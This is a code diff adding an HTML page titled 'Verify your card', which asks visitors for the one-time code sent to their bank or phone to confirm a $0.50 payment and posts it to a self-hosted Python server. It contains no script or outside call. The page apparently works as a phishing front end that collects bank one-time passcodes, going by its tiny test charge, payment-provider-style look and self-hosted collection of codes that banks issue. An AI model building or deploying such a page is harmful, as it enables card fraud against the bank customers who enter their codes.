@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify Card</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: 'Outfit', system-ui, sans-serif;
+  background: #05050a;
+  min-height: 100vh;
+  color: #f0f0f5;
+}
+
+.bg {
+  position: fixed;
+  inset: 0;
+  z-index: 0;
+  background:
+    radial-gradient(ellipse at 30% 20%, rgba(124, 58, 237, 0.22) 0%, transparent 50%),
+    radial-gradient(ellipse at 70% 80%, rgba(219, 39, 119, 0.18) 0%, transparent 45%),
+    #05050a;
+}
+
+.page {
+  position: relative;
+  z-index: 1;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 20px;
+}
+
+.card {
+  width: 100%;
+  max-width: 400px;
+  background: rgba(18, 18, 28, 0.8);
+  backdrop-filter: blur(24px);
+  -webkit-backdrop-filter: blur(24px);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-radius: 24px;
+  padding: 36px 28px 32px;
+  box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45);
+  text-align: center;
+}
+
+.icon {
+  width: 64px;
+  height: 64px;
+  margin: 0 auto 18px;
+  border-radius: 16px;
+  background: linear-gradient(135deg, rgba(99, 91, 255, 0.25), rgba(168, 85, 247, 0.2));
+  border: 1px solid rgba(167, 139, 250, 0.3);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.8rem;
+}
+
+h1 {
+  font-size: 1.35rem;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.sub {
+  font-size: 0.9rem;
+  color: #9a9ab0;
+  line-height: 1.5;
+  margin-bottom: 28px;
+}
+
+.sub strong {
+  color: #c4b5fd;
+}
+
+form {
+  text-align: left;
+}
+
+label {
+  display: block;
+  font-size: 0.78rem;
+  font-weight: 500;
+  color: #9a9ab0;
+  margin-bottom: 6px;
+}
+
+input {
+  width: 100%;
+  padding: 14px 14px;
+  margin-bottom: 16px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 12px;
+  background: rgba(255, 255, 255, 0.04);
+  color: #f0f0f5;
+  font-size: 1.15rem;
+  font-family: inherit;
+  letter-spacing: 0.2em;
+  text-align: center;
+}
+
+input::placeholder {
+  color: #5c5c72;
+  letter-spacing: normal;
+  font-size: 0.95rem;
+}
+
+input:focus {
+  outline: none;
+  border-color: rgba(99, 91, 255, 0.55);
+  background: rgba(99, 91, 255, 0.06);
+  box-shadow: 0 0 0 3px rgba(99, 91, 255, 0.12);
+}
+
+button[type="submit"] {
+  width: 100%;
+  padding: 15px;
+  background: linear-gradient(135deg, #635bff, #a855f7);
+  color: white;
+  border: none;
+  border-radius: 12px;
+  font-size: 1rem;
+  font-weight: 600;
+  font-family: inherit;
+  cursor: pointer;
+  box-shadow: 0 8px 28px rgba(99, 91, 255, 0.35);
+  transition: transform 0.15s, box-shadow 0.15s;
+}
+
+button[type="submit"]:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 12px 36px rgba(99, 91, 255, 0.45);
+}
+
+.note {
+  margin-top: 16px;
+  font-size: 0.78rem;
+  color: #6b6b80;
+  text-align: center;
+  line-height: 1.45;
+}
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+
+<div class="page">
+  <div class="card">
+    <div class="icon">🔐</div>
+    <h1>Verify your card</h1>
+    <p class="sub">
+      Enter the verification code sent to your bank / phone
+      to confirm this payment of <strong>$0.50</strong>.
+    </p>
+
+    <!-- POST to same Python server -->
+    <form action="/verify-code" method="POST">
+      <label for="code">Verification code</label>
+      <input
+        type="text"
+        id="code"
+        name="code"
+        placeholder="Enter code"
+        inputmode="numeric"
+        autocomplete="one-time-code"
+        required
+      />
+
+      <button type="submit">
+        Confirm &amp; continue
+      </button>
+    </form>
+
+    <p class="note">
+      This code is usually 4–8 digits from your bank SMS or app.
+    </p>
+  </div>
+</div>
+
+</body>
+</html>
